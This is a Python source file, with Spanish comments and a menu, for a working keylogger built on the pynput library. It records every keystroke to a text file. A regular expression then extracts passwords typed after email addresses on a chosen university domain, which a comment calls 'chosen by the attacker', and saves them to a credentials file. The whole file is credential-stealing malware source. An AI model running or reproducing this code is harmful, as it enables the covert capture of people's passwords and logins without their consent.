from pynput import keyboard
import re, os

os.system("clear")

#Declaro la clase para poder introducir colores al programa
class Color:
    PURPLE = '\833[95m'

    CYAN = '\033[96m'

    DARKCYAN = '\033[36m'

    BLUE = '\033[94m'

    GREEN = '\033[92m'

    YELLOW = '\033[93m'

    RED = '\033[91m'

    BOLD = '\033[1m'

    UNDERLINE = '\033[4m'

    END = '\033[0m'

#Defino la funcion que va a guardar las pulsaciones del teclado y va a almacenar las teclas en un fichero de texto
def recordKey():
    with open("keylog.txt", "w") as file:
        def on_press(key):
            try:
                #Para que el programa pueda capturar correctamente todas las credenciales introducidas sustituimos la pulsacion de un salto de linea por un intro
                if key == keyboard.Key.enter:
                    file.write(' ')
                elif key == keyboard.Key.space:
                    file.write(' ')
                #Defino esto para que el usuario pueda salir del KeyLogger
                elif key == keyboard.Key.esc:
                    os.system('clear')
                    return False
                else:
                #Aqui es donde se van a guardar las teclas que utilice el usuario
                    file.write(key.char)
            except AttributeError:
                pass
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()

#Defino la funcion que va a leer todas las palabras que haya guardado el usuario
def printDataConsole():
    with open("keylog.txt", "r") as file:
        print(file.read())
#hacer un backup de los logs
def saveInFile():
    with open("keylog.txt", "r") as file:
        with open("keylog_backup.txt", "w") as backup:
            backup.write(file.read())
#Funcion que va a servir para detectar todas las credenciales introducidas por el usuario y almacenarlas en otro fichero de texto distinto
def detectEIPassword():
    # Expresión regular para detectar correos con dominio elegido por el atacante
    regex = r'@dominio\.edu\.es\s+(\S+)'
    with open("keylog.txt", 'r') as f:
        content = f.read()
        match = re.findall(regex, content) 
        if match:
            print(f"Se detectaron {len(match)} credenciales")
            with open('credentials.txt', 'a') as cred:
                for password in match:
                # Guardar la palabra en el archivo credentials.txt
                    cred.write(password + '\n')
        else:
                print('No se detectaron credenciales')

def readLogs():
    with open("keylog.txt", "r") as file:
        print(file.read())

def readCredentials():
    with open("credentials.txt", "r") as file:
        print(file.read())

def menu():
    with keyboard.Events() as events:
        while True:
            print(Color.BOLD+"1. Iniciar keylogger")
            print("2. Mostrar registros del keylogger")
            print("3. Mostrar credenciales detectadas")
            print("4. Hacer una copia de seguridad de los registros")
            print("5. Comprobar si se han capturado credenciales")
            print("6. Limpiar la consola")
            print("7. Salir"+Color.END)

            option = input(Color.BOLD+Color.YELLOW+"Seleccione una opción: "+Color.END)
            match option:
                case "1":
                    print(Color.GREEN+"Iniciando keylogger..."+Color.END)
                    recordKey()
                case "2":
                    readLogs()
                case "3":
                    readCredentials()
                case "4":
                    print(Color.BLUE+"Creando copia de seguridad..."+Color.END)
                    saveInFile()
                case "5":
                    detectEIPassword()
                case "6":
                    os.system("clear")
                case "7":
                    print(Color.BOLD+Color.RED+"Saliendo...."+Color.END)
                    break
                case _:
                    print('\n'+"Vuelva a introducir una opcion")
                    input(Color.BOLD+"Volver al menu..."+Color.END)
            
if __name__ == "__main__":
    menu()


